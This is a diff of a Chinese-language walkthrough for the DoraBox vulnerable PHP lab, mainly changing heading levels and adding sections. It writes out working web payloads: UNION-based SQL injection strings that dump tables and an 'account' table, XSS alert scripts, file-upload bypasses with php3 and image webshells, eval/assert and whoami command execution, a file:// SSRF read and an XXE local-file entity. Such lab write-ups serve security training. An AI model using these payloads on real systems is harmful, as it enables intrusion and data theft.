@@ -1,15 +1,15 @@
 # DoraBox
 
-# Sql注入
+## Sql注入
 
-## 第一关，sql注入数字型
+### 第一关，sql注入数字型
 
 
 源码中id是htmlspecialchars过滤的，过滤是过滤单引号，双引号，尖括号和&的，但是过滤的是html实体并不会影响我们的操作
 
 ![image-20220226143949141](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202202261439284.png)
 
-### 1、测试参数位置
+#### 1、测试参数位置
 
 ```
 -1 union select 1,2,3
@@ -17,7 +17,9 @@
 
 
 
-### (https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202202261440461.png)2、爆数据库：
+### ![image-20220226144057400](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202202261440461.png)
+
+#### 2、爆数据库：
 
 ```
 -1 union select 1,user(),database()
@@ -25,7 +27,7 @@
 
 ![](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202202261441408.png)
 
-### 3、爆表：
+#### 3、爆表：
 
 ```
 -1 UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()
@@ -33,7 +35,7 @@
 
 
 
-### 4、爆列名：
+#### 4、爆列名：
 
 ```
 -1 UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name='news'
@@ -41,7 +43,7 @@
 
 
 
-### 5、爆值：
+#### 5、爆值：
 
 ```
 -1 UNION SELECT 1,2,concat_ws('|',id,title,content) from news
@@ -49,7 +51,7 @@
 
 ![image-20220226144410955](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202202261444010.png)
 
-## 第二关，Sql注入字符型
+### 第二关，Sql注入字符型
 
 
 这关和之前是差不多的，就是要闭合一下单引号即可
@@ -62,7 +64,7 @@ DoraBox' and '1'='2' union select 1,2,3'
 
 ![image-20220226144634958](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202202261446000.png)
 
-### 爆表:
+#### 爆表:
 
 ```
 DoraBox' and '1'='2' UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#
@@ -70,7 +72,7 @@ DoraBox' and '1'='2' UNION SELECT 1,2,group_concat(table_name) from information_
 
 ![image-20220226144816563](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202202261448631.png)
 
-### 爆列名:
+#### 爆列名:
 
 ```
 DoraBox' and '1'='2' UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name='news'#
@@ -78,19 +80,19 @@ DoraBox' and '1'='2' UNION SELECT 1,2,group_concat(column_name) from information
 
 ![image-20220226144858626](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202202261448690.png)
 
-### 爆值：
+#### 爆值：
 
 DoraBox' and '1'='2' UNION SELECT 1,2,concat_ws('|',id,title,content) from news#
 
 ![image-20220226144927164](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202202261449209.png)
 
-## 第二关,Sql注入搜索型
+### 第二关,Sql注入搜索型
 
 这里百分号和单引号都需要闭合
 
 ![image-20220226145003517](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202202261450574.png)
 
-### 爆表：
+#### 爆表：
 
 ```
 -1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#
@@ -98,7 +100,7 @@ DoraBox' and '1'='2' UNION SELECT 1,2,concat_ws('|',id,title,content) from news#
 
 
 
-### 爆列：
+#### 爆列：
 
 ```
 -1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='pentest' and table_name='account'#
@@ -106,7 +108,7 @@ DoraBox' and '1'='2' UNION SELECT 1,2,concat_ws('|',id,title,content) from news#
 
 
 
-### 爆数据：
+#### 爆数据：
 
 ```
 -1' union select 1,2,concat_ws(",",id,rest,own) from account#
@@ -114,9 +116,9 @@ DoraBox' and '1'='2' UNION SELECT 1,2,concat_ws('|',id,title,content) from news#
 
 ```
 
-# Xss跨站
+## Xss跨站
 
-## Xss反射型
+### Xss反射型
 
 ```
 <script>alert(/XSS/)</script>
@@ -140,7 +142,7 @@ DoraBox' and '1'='2' UNION SELECT 1,2,concat_ws('|',id,title,content) from news#
 
 
 
-## Xss存储型
+### Xss存储型
 
 这个xss是存储到数据库里的，每次刷新当前页面都会执行
 
@@ -152,7 +154,7 @@ DoraBox' and '1'='2' UNION SELECT 1,2,concat_ws('|',id,title,content) from news#
 
 
 
-## Xssdom型
+### Xssdom型
 
 输入`<script>alert(/DOM_xss/)</script>`
 
@@ -162,9 +164,9 @@ DoraBox' and '1'='2' UNION SELECT 1,2,concat_ws('|',id,title,content) from news#
 
 
 
-# 文件包含
+## 文件包含
 
-## 任意文件包含
+### 任意文件包含
 
 直接输入 txt.txt包含文件
 
@@ -172,7 +174,7 @@ DoraBox' and '1'='2' UNION SELECT 1,2,concat_ws('|',id,title,content) from news#
 
 源码中，这里是直接包含的，中间没有过滤
 
-## 目录限制文件包含
+### 目录限制文件包含
 
 源码这里其实并没有限制目录文件包含
 
@@ -182,9 +184,9 @@ DoraBox' and '1'='2' UNION SELECT 1,2,concat_ws('|',id,title,content) from news#
 
 
 
-# 文件上传
+## 文件上传
 
-## 任意文件上传
+### 任意文件上传
 
 这个页面上传什么文件都可以，不多介绍
 
@@ -196,7 +198,7 @@ DoraBox' and '1'='2' UNION SELECT 1,2,concat_ws('|',id,title,content) from news#
 
 
 
-## Js限制文件上传
+### Js限制文件上传
 
 直接限制了我们上传php文件
 
@@ -208,7 +210,7 @@ DoraBox' and '1'='2' UNION SELECT 1,2,concat_ws('|',id,title,content) from news#
 
 ![image-20220226150622397](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202202261506463.png)
 
-## Mime限制上传
+### Mime限制上传
 
 只要是这四种类型的mime都给上传，那我们直接抓包Content-Type改下即可
 
@@ -216,7 +218,7 @@ DoraBox' and '1'='2' UNION SELECT 1,2,concat_ws('|',id,title,content) from news#
 
 ![](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202202261514350.png)
 
-## 扩展名限制文件上传
+### 扩展名限制文件上传
 
 
 这里源码中限制了一些后缀，我们把后缀改成php3即可
@@ -225,9 +227,67 @@ DoraBox' and '1'='2' UNION SELECT 1,2,concat_ws('|',id,title,content) from news#
 
 
 
-## 内容限制上传
+### 内容限制上传
 
 这关可以直接用图片马来绕过
 
 ![image-20220226151806303](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202202261518357.png)
+
+## 代码/命令
+
+### 任意代码执行
+
+#### eval函数
+
+把里面的字符串作为PHP代码执行
+
+所以我们输入eval(phpinfo())就会被当作php代码执行
+
+  ![image-20220303152843121](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203031528310.png)                             
+
+#### assert函数
+
+用来判断一个表达式是否成立，返回true or false。
+
+如果里面是字符串，它将会被 assert() 当做 PHP 代码来执行。
+
+所以我们输入assert(phpinfo())就会被当作php代码执行
+
+ ![image-20220303152910070](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203031529124.png)
+
+### 任意命令执行
+
+输入whoami就有回显
+
+![image-20220303152958404](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203031529460.png)
+
+## ssrf
+
+直接敲回车发现是`file_get_contents()`
+
+![image-20220303153146656](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203031531717.png)
+
+尝试访问直接DoraBox主页
+
+![image-20220303153228310](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203031532427.png)
+
+我们也可以使用`file://`协议去读取文件
+
+![image-20220303153530706](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203031535796.png)
+
+## xee
+
+访问抓包
+
+```
+<?xml version="1.0"?>
+<!DOCTYPE Mikasa [ 
+<!ENTITY hellwork SYSTEM  "file:///D:/2.txt">
+]>
+<user><username>&hellwork;</username><password>Mikasa</password></user>
+```
+
+![image-20220303155754819](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203031558964.png)
+
+![image-20220303155826497](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203031558553.png)
 
